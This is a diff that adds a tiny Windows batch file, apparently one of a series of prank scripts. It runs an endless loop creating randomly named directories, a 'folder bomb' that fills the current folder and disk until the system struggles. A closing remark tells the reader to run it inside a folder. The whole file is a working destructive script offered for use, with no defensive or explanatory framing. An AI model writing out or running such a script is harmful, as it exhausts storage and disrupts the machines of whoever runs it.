@@ -1,0 +1,8 @@
+@echo off
+:fucklv2
+md %random%
+goto :fucklv2
+
+#procedure same as previous ;)
+but remember to run this in a 
+folder.
